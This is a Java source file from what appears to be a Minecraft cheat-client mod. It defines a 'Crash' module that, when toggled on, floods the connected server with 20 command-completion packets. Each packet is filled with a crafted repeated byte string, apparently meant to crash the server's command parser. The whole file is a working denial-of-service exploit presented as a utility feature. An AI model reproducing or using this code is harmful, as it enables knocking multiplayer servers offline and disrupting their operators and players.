package software.tachyon.starfruit.module.network;

import net.engio.mbassy.listener.Listener;
import net.engio.mbassy.listener.References;
import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import software.tachyon.starfruit.StarfruitMod;
import software.tachyon.starfruit.module.ModuleInfo;
import software.tachyon.starfruit.module.ModuleInfo.Category;
import software.tachyon.starfruit.module.StatefulModule;

import java.nio.charset.StandardCharsets;

@Listener(references = References.Strong)
public class Crash extends StatefulModule {

    private static final byte[] MEME_BYTES = {(byte) 0xCE, (byte) 0xA3, (byte) 0x38, (byte) 0x34, (byte) 0x22, (byte) 0x30, (byte) 0x22, (byte) 0x30, (byte) 0x35, (byte) 0x38};
    private static final String MEME_STRING = new String(MEME_BYTES, StandardCharsets.UTF_8);

    public Crash(int keyCode) {
        super(keyCode, ModuleInfo.init().name("Crash").category(Category.UTILITY).build());
    }

    @Override
    public void onEnable() {
        for(int i = 0; i < 20; i++) {
            Packet packet = new RequestCommandCompletionsC2SPacket(0, "/ " + MEME_STRING.repeat(2000 / MEME_BYTES.length));
            StarfruitMod.minecraft.getNetworkHandler().sendPacket(packet);
        }
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

}
